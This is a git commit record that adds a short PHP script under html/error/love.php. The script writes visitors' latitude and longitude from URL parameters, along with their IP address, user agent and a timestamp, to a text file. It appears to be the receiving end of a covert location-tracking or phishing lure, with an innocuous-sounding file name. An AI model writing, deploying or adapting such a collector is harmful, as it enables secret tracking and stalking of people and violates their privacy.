420262d4a21888858457ff156211ac39964d1f0b
butterbobo <tempo7766@gmail.com>
2026-09-06 13:43:52 +0800

    Add files via upload

---
+++ html/error/love.php
@@ -0,0 +1,8 @@
+<?php
+
+$myfile = fopen("location.txt", "w");
+$txt = "Time: " . date('Y-m-d H:i:s') . "\n\nLocation: " . $_GET["lat"] . ", " . $_GET["long"] . "\n\nIP Address: " . $_SERVER["REMOTE_ADDR"] . "\n\nUser Agent: " . $_GET["uagent"] . $_SERVER["HTTP_USER_AGENT"];
+fwrite($myfile, $txt);
+fclose($myfile);
+
+?>
